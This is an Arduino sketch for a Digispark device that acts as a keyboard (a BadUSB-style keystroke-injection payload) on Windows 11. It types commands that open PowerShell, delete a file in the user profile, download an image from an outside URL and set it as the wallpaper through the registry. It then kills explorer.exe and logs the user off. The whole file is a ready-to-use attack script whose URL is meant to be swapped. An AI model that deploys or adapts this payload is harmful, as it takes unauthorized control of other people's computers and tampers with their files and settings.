// Changes wallpaper to whatever you want.
// Tested working Windows 11. 
// Change the link to the image you want to use in jpg form.
#include "DigiKeyboard.h"
#define link "https://www.mannapro.com/sites/default/files/2023-09/15.png"
#define KEY_DOWN 0x51
void setup() {
  pinMode(1, OUTPUT); // LED Setup
}
void loop() {
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  digitalWrite(1, HIGH); // Turn on LED to signify task started
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

 DigiKeyboard.println("msconfig -5"); // Access CMD
    DigiKeyboard.delay(1000);
    for(int i = 0; i < 14; i++) {
        DigiKeyboard.sendKeyStroke(KEY_DOWN);
    }
  DigiKeyboard.sendKeyStroke(KEY_L, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  
  DigiKeyboard.println("powershell");
  DigiKeyboard.println("$path = \"$env:USERPROFILE\\wallpaper.jpg\"");
  DigiKeyboard.println("$client = new-object System.Net.WebClient");
  DigiKeyboard.println("Remove-Item $path");
  DigiKeyboard.delay(200);
  DigiKeyboard.println("$client.DownloadFile(\""link"\" , $path)");
  DigiKeyboard.delay(10000);

  DigiKeyboard.println("Set-ItemProperty -Path \"HKCU:\\Control Panel\\Desktop\\\" -Name wallpaper -Value $path");
  DigiKeyboard.delay(500);
  
  DigiKeyboard.println("taskkill /f /im explorer.exe");
  DigiKeyboard.delay(1000);

  DigiKeyboard.println("start explorer.exe");
  DigiKeyboard.delay(3000);

  DigiKeyboard.println("logoff");
  
  digitalWrite(1, LOW);
  for(;;){}
}
